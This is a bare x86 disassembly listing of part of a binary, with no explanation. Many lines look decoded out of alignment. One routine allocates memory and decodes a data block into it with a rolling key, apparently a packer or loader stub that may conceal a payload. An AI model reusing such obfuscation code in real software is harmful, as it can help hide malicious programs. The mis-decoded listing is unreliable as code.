  4d109d:	add    BYTE PTR [eax],al
  4d109f:	add    BYTE PTR [edi-0x1],bl
  4d10a2:	adc    eax,0x4d2004
  4d10a7:	call   edi
  4d10a9:	add    BYTE PTR [eax],al
  4d10ab:	add    BYTE PTR [edi-0x1],bl
  4d10ae:	adc    eax,0x4d2014
  4d10b3:	call   edi
  4d10b5:	add    BYTE PTR [eax],al
  4d10b7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10bd:	sub    esp,0x54
  4d10c0:	lea    ebx,ds:0x4d31d4
  4d10c6:	adc    DWORD PTR [ebx-0xc0],edx
  4d10cc:	push   ebx
  4d10cd:	push   DWORD PTR [ebx+0x1ac]
  4d10d3:	push   DWORD PTR [ebx+0x1c0]
  4d10d9:	push   DWORD PTR [ebx+0x19c]
  4d10df:	call   0x4d138c
  4d10e4:	add    esp,0xc
  4d10e7:	pop    ebx
  4d10e8:	call   0x4d0f1c
  4d10ed:	add    esp,0x4
  4d10f0:	lea    eax,[ebx-0x1d4]
  4d10f6:	push   eax
  4d10f7:	call   0x4d0b10
  4d10fc:	add    esp,0x4
  4d10ff:	test   eax,eax
  4d1101:	jne    0x4d10f1
  4d1103:	add    esp,0x54
  4d1106:	pop    ebp
  4d1107:	ret    
  4d1108:	pop    edi
  4d1109:	call   DWORD PTR ds:0x4d2024
  4d110f:	call   edi
  4d1111:	add    BYTE PTR [eax],al
  4d1113:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1119:	sub    esp,0x4c
  4d111c:	lea    eax,[edx-0x9c]
  4d1122:	mov    ebx,DWORD PTR [ebp-0x20]
  4d1125:	push   eax
  4d1126:	push   ecx
  4d1127:	push   DWORD PTR [eax+0xf0]
  4d112d:	push   DWORD PTR [eax+0x1ec]
  4d1133:	push   DWORD PTR [eax+0x44]
  4d1136:	call   0x4d0e44
  4d113b:	add    esp,0x10
  4d113e:	pop    eax
  4d113f:	push   eax
  4d1140:	call   0x4d10ac
  4d1145:	add    esp,0x4
  4d1148:	pop    eax
  4d1149:	push   eax
  4d114a:	lea    eax,[eax-0x104]
  4d1150:	push   eax
  4d1151:	call   0x4d0b10
  4d1156:	add    esp,0x4
  4d1159:	test   eax,eax
  4d115b:	jne    0x4d114a
  4d115d:	pop    eax
  4d115e:	add    esp,0x4c
  4d1161:	pop    ebp
  4d1162:	ret    
  4d1163:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1169:	sub    esp,0x38
  4d116c:	lea    edx,ds:0x4d3078
  4d1172:	add    DWORD PTR [ebp-0x34],0xffffffbd
  4d1176:	push   edx
  4d1177:	push   eax
  4d1178:	push   DWORD PTR [edx+0xc8]
  4d117e:	push   ebx
  4d117f:	push   DWORD PTR [edx+0x58]
  4d1182:	call   0x4d0a08
  4d1187:	add    esp,0x10
  4d118a:	pop    edx
  4d118b:	push   edx
  4d118c:	push   0x0
  4d118e:	call   0x4d09c0
  4d1193:	add    esp,0x4
  4d1196:	pop    edx
  4d1197:	push   edx
  4d1198:	mov    ebx,0x0
  4d119d:	push   ebx
  4d119e:	call   0x4d0d34
  4d11a3:	add    esp,0x4
  4d11a6:	pop    edx
  4d11a7:	add    esp,0x38
  4d11aa:	pop    ebp
  4d11ab:	ret    
  4d11ac:	mov    edi,edi
  4d11ae:	push   ebp
  4d11af:	mov    ebp,esp
  4d11b1:	sub    esp,0x3c
  4d11b4:	lea    ecx,[edi-0x1c]
  4d11b7:	and    DWORD PTR [ecx+0x40],edx
  4d11ba:	push   ecx
  4d11bb:	call   0x4d10ac
  4d11c0:	add    esp,0x4
  4d11c3:	pop    ecx
  4d11c4:	push   ecx
  4d11c5:	push   edi
  4d11c6:	push   edi
  4d11c7:	call   0x4d0edc
  4d11cc:	add    esp,0x8
  4d11cf:	pop    ecx
  4d11d0:	push   ecx
  4d11d1:	mov    ecx,0x0
  4d11d6:	push   ecx
  4d11d7:	call   0x4d15a8
  4d11dc:	add    esp,0x4
  4d11df:	pop    ecx
  4d11e0:	add    esp,0x3c
  4d11e3:	pop    ebp
  4d11e4:	ret    
  4d11e5:	add    BYTE PTR [eax],al
  4d11e7:	add    BYTE PTR [edi-0x1],bl
  4d11ea:	adc    eax,0x4d2030
  4d11ef:	call   edi
  4d11f1:	add    BYTE PTR [eax],al
  4d11f3:	add    BYTE PTR [edi-0x1],bl
  4d11f6:	adc    eax,0x4d208c
  4d11fb:	call   edi
  4d11fd:	add    BYTE PTR [eax],al
  4d11ff:	add    BYTE PTR [edi-0x1],bl
  4d1202:	adc    eax,0x4d2084
  4d1207:	call   edi
  4d1209:	add    BYTE PTR [eax],al
  4d120b:	add    BYTE PTR [edi-0x1],bl
  4d120e:	adc    eax,0x4d201c
  4d1213:	call   edi
  4d1215:	add    BYTE PTR [eax],al
  4d1217:	add    BYTE PTR [edi-0x1],bl
  4d121a:	adc    eax,0x4d203c
  4d121f:	call   edi
  4d1221:	add    BYTE PTR [eax],al
  4d1223:	add    BYTE PTR [edi-0x1],bl
  4d1226:	adc    eax,0x4d2034
  4d122b:	call   edi
  4d122d:	add    BYTE PTR [eax],al
  4d122f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1235:	sub    esp,0x20
  4d1238:	lea    ecx,ds:0x4d3118
  4d123e:	cmp    ecx,0x5bac
  4d1244:	jb     0x4d1233
  4d1246:	push   ecx
  4d1247:	push   ebx
  4d1248:	push   DWORD PTR [ecx+0x168]
  4d124e:	push   DWORD PTR [ecx+0x1ac]
  4d1254:	call   0x4d09cc
  4d1259:	add    esp,0xc
  4d125c:	pop    ecx
  4d125d:	push   ecx
  4d125e:	call   0x4d0d58
  4d1263:	add    esp,0x4
  4d1266:	pop    ecx
  4d1267:	push   ecx
  4d1268:	mov    ebx,0x0
  4d126d:	push   ebx
  4d126e:	call   0x4d1434
  4d1273:	add    esp,0x4
  4d1276:	pop    ecx
  4d1277:	add    esp,0x20
  4d127a:	pop    ebp
  4d127b:	ret    
  4d127c:	mov    edi,edi
  4d127e:	push   ebp
  4d127f:	mov    ebp,esp
  4d1281:	sub    esp,0x44
  4d1284:	lea    ebx,[ecx+0xa0]
  4d128a:	cmp    ebx,0x38d
  4d1290:	je     0x4d127f
  4d1292:	push   ebx
  4d1293:	push   DWORD PTR [ebx+0xd0]
  4d1299:	push   eax
  4d129a:	call   0x4d0b7c
  4d129f:	add    esp,0x8
  4d12a2:	pop    ebx
  4d12a3:	push   0xfffffff4
  4d12a5:	call   0x4d0aa4
  4d12aa:	add    esp,0x4
  4d12ad:	push   0x0
  4d12af:	call   0x4d0d34
  4d12b4:	add    esp,0x4
  4d12b7:	add    esp,0x44
  4d12ba:	pop    ebp
  4d12bb:	ret    
  4d12bc:	pop    edi
  4d12bd:	call   DWORD PTR ds:0x4d2060
  4d12c3:	call   edi
  4d12c5:	add    BYTE PTR [eax],al
  4d12c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12cd:	sub    esp,0x24
  4d12d0:	lea    ebx,[edi-0x17c]
  4d12d6:	sbb    edx,edi
  4d12d8:	push   ebx
  4d12d9:	push   eax
  4d12da:	push   DWORD PTR [ebx+0x164]
  4d12e0:	push   DWORD PTR [ebx+0x1dc]
  4d12e6:	push   ecx
  4d12e7:	call   0x4d0cd4
  4d12ec:	add    esp,0x10
  4d12ef:	pop    ebx
  4d12f0:	mov    edx,0xfffffff4
  4d12f5:	push   edx
  4d12f6:	call   0x4d0aa4
  4d12fb:	add    esp,0x4
  4d12fe:	push   0x0
  4d1300:	call   0x4d1218
  4d1305:	add    esp,0x4
  4d1308:	add    esp,0x24
  4d130b:	pop    ebp
  4d130c:	ret    
  4d130d:	add    BYTE PTR [eax],al
  4d130f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1315:	sub    esp,0x2c
  4d1318:	lea    edx,[esi+0x7c]
  4d131b:	and    DWORD PTR [ebp-0x14],ecx
  4d131e:	push   edx
  4d131f:	call   0x4d10ac
  4d1324:	add    esp,0x4
  4d1327:	pop    edx
  4d1328:	push   edx
  4d1329:	push   DWORD PTR [edx+0x44]
  4d132c:	push   DWORD PTR [edx+0x1ac]
  4d1332:	call   0x4d08f0
  4d1337:	add    esp,0x8
  4d133a:	pop    edx
  4d133b:	push   edx
  4d133c:	push   0x0
  4d133e:	call   0x4d1094
  4d1343:	add    esp,0x4
  4d1346:	pop    edx
  4d1347:	add    esp,0x2c
  4d134a:	pop    ebp
  4d134b:	ret    
  4d134c:	mov    edi,edi
  4d134e:	push   ebp
  4d134f:	mov    ebp,esp
  4d1351:	sub    esp,0x60
  4d1354:	lea    ecx,[edi+0x18]
  4d1357:	xor    DWORD PTR [ebp-0x24],edi
  4d135a:	push   ecx
  4d135b:	push   DWORD PTR [ecx+0x74]
  4d135e:	push   edi
  4d135f:	push   DWORD PTR [ecx+0x6c]
  4d1362:	call   0x4d0c80
  4d1367:	add    esp,0xc
  4d136a:	pop    ecx
  4d136b:	push   ecx
  4d136c:	push   0x0
  4d136e:	call   0x4d1094
  4d1373:	add    esp,0x4
  4d1376:	pop    ecx
  4d1377:	push   ecx
  4d1378:	mov    edx,0x0
  4d137d:	push   edx
  4d137e:	call   0x4d1108
  4d1383:	add    esp,0x4
  4d1386:	pop    ecx
  4d1387:	add    esp,0x60
  4d138a:	pop    ebp
  4d138b:	ret    
  4d138c:	mov    edi,edi
  4d138e:	push   ebp
  4d138f:	mov    ebp,esp
  4d1391:	sub    esp,0x30
  4d1394:	lea    edx,ds:0x4d31bc
  4d139a:	sub    DWORD PTR [edx+0x38],0x4182
  4d13a1:	push   edx
  4d13a2:	mov    edx,0x0
  4d13a7:	push   edx
  4d13a8:	call   0x4d15a8
  4d13ad:	add    esp,0x4
  4d13b0:	pop    edx
  4d13b1:	push   edx
  4d13b2:	push   ecx
  4d13b3:	push   DWORD PTR [edx+0xbc]
  4d13b9:	push   esi
  4d13ba:	push   DWORD PTR [edx+0x184]
  4d13c0:	call   0x4d0828
  4d13c5:	add    esp,0x10
  4d13c8:	pop    edx
  4d13c9:	push   edx
  4d13ca:	push   0x0
  4d13cc:	call   0x4d09c0
  4d13d1:	add    esp,0x4
  4d13d4:	pop    edx
  4d13d5:	add    esp,0x30
  4d13d8:	pop    ebp
  4d13d9:	ret    
  4d13da:	add    BYTE PTR [eax],al
  4d13dc:	pop    edi
  4d13dd:	call   DWORD PTR ds:0x4d2088
  4d13e3:	call   edi
  4d13e5:	add    BYTE PTR [eax],al
  4d13e7:	add    BYTE PTR [edi-0x1],bl
  4d13ea:	adc    eax,0x4d2064
  4d13ef:	call   edi
  4d13f1:	add    BYTE PTR [eax],al
  4d13f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13f9:	sub    esp,0x4c
  4d13fc:	mov    edx,0x4d3154
  4d1401:	cmp    edx,0x388b
  4d1407:	jbe    0x4d13f7
  4d1409:	push   edx
  4d140a:	mov    esi,0x0
  4d140f:	push   esi
  4d1410:	call   0x4d0d34
  4d1415:	add    esp,0x4
  4d1418:	pop    edx
  4d1419:	push   edx
  4d141a:	push   edi
  4d141b:	push   esi
  4d141c:	call   0x4d07d8
  4d1421:	add    esp,0x8
  4d1424:	pop    edx
  4d1425:	push   edx
  4d1426:	call   0x4d0f1c
  4d142b:	add    esp,0x4
  4d142e:	pop    edx
  4d142f:	add    esp,0x4c
  4d1432:	pop    ebp
  4d1433:	ret    
  4d1434:	pop    edi
  4d1435:	call   DWORD PTR ds:0x4d2018
  4d143b:	call   edi
  4d143d:	add    BYTE PTR [eax],al
  4d143f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1445:	sub    esp,0x48
  4d1448:	lea    esi,ds:0x4d30bc
  4d144e:	sbb    DWORD PTR [esi+0x38],0x73
  4d1452:	push   0x0
  4d1454:	call   0x4d1094
  4d1459:	add    esp,0x4
  4d145c:	push   esi
  4d145d:	push   DWORD PTR [esi+0x6c]
  4d1460:	push   DWORD PTR [esi+0xf8]
  4d1466:	push   DWORD PTR [esi+0x1f0]
  4d146c:	call   0x4d0fbc
  4d1471:	add    esp,0xc
  4d1474:	pop    esi
  4d1475:	push   0x0
  4d1477:	call   0x4d0d34
  4d147c:	add    esp,0x4
  4d147f:	add    esp,0x48
  4d1482:	pop    ebp
  4d1483:	ret    
  4d1484:	pop    edi
  4d1485:	call   DWORD PTR ds:0x4d2058
  4d148b:	call   edi
  4d148d:	add    BYTE PTR [eax],al
  4d148f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1495:	sub    esp,0x48
  4d1498:	lea    edx,ds:0x4d3168
  4d149e:	or     DWORD PTR [ebp-0x24],0x63
  4d14a2:	push   edx
  4d14a3:	call   0x4d10ac
  4d14a8:	add    esp,0x4
  4d14ab:	pop    edx
  4d14ac:	push   edx
  4d14ad:	push   DWORD PTR [edx+0x38]
  4d14b0:	push   eax
  4d14b1:	push   DWORD PTR [edx+0x19c]
  4d14b7:	call   0x4d0c40
  4d14bc:	add    esp,0xc
  4d14bf:	pop    edx
  4d14c0:	push   edx
  4d14c1:	push   0x0
  4d14c3:	call   0x4d1218
  4d14c8:	add    esp,0x4
  4d14cb:	pop    edx
  4d14cc:	add    esp,0x48
  4d14cf:	pop    ebp
  4d14d0:	ret    
  4d14d1:	add    BYTE PTR [eax],al
  4d14d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14d9:	sub    esp,0x5c
  4d14dc:	add    DWORD PTR [ecx-0x24],0xffffd561
  4d14e3:	lea    esi,[ecx-0x1b8]
  4d14e9:	mov    eax,0x6ac
  4d14ee:	push   eax
  4d14ef:	push   0x6ac
  4d14f4:	push   0x40001
  4d14f9:	mov    edi,0x862985c2
  4d14fe:	push   DWORD PTR [edi+0x7a239a86]
  4d1504:	sub    DWORD PTR [esp],0x2
  4d1508:	mov    edi,0x4d2008
  4d150d:	pop    DWORD PTR [edi]
  4d150f:	call   0x4d0d40
  4d1514:	add    esp,0x4
  4d1517:	push   eax
  4d1518:	pop    DWORD PTR [esi+0x5c]
  4d151b:	mov    edi,DWORD PTR [esi+0x5c]
  4d151e:	mov    ebx,edi
  4d1520:	sub    eax,eax
  4d1522:	dec    eax
  4d1523:	and    eax,0x4d0014
  4d1528:	mov    edx,0x7ec7f445
  4d152d:	mov    ecx,0x6ac
  4d1532:	cmp    ecx,0x0
  4d1535:	je     0x4d1553
  4d1537:	add    ecx,0xfffffffc
  4d153a:	xor    edi,edi
  4d153c:	push   DWORD PTR [eax+edi*1]
  4d153f:	add    DWORD PTR [esp],edx
  4d1542:	pop    DWORD PTR [ebx+edi*2]
  4d1545:	dec    DWORD PTR [ebx]
  4d1547:	xor    edx,edx
  4d1549:	add    edx,DWORD PTR [eax]
  4d154b:	add    eax,0x4
  4d154e:	add    ebx,0x4
  4d1551:	jmp    0x4d1532
  4d1553:	push   0x0
  4d1555:	call   0x4d10a0
  4d155a:	add    esp,0x4
  4d155d:	add    esp,0x5c
  4d1560:	pop    ebp
  4d1561:	ret    
  4d1562:	add    BYTE PTR [eax],al
  4d1564:	mov    edi,edi
  4d1566:	push   ebp
  4d1567:	mov    ebp,esp
  4d1569:	sub    esp,0x5c
  4d156c:	lea    edx,[ebx+0x164]
  4d1572:	sbb    ecx,edi
  4d1574:	push   edx
  4d1575:	push   edi
  4d1576:	push   edi
  4d1577:	call   0x4d0978
  4d157c:	add    esp,0x8
  4d157f:	pop    edx
  4d1580:	push   edx
  4d1581:	mov    edx,0x0
  4d1586:	push   edx
  4d1587:	call   0x4d1434
  4d158c:	add    esp,0x4
  4d158f:	pop    edx
  4d1590:	push   edx
  4d1591:	mov    edi,0x0
  4d1596:	push   edi
  4d1597:	call   0x4d10a0
  4d159c:	add    esp,0x4
  4d159f:	pop    edx
  4d15a0:	add    esp,0x5c
  4d15a3:	pop    ebp
  4d15a4:	ret    
  4d15a5:	add    BYTE PTR [eax],al
  4d15a7:	add    BYTE PTR [edi-0x1],bl
  4d15aa:	adc    eax,0x4d202c
  4d15af:	call   edi
  4d15b1:	add    BYTE PTR [eax],al
	...
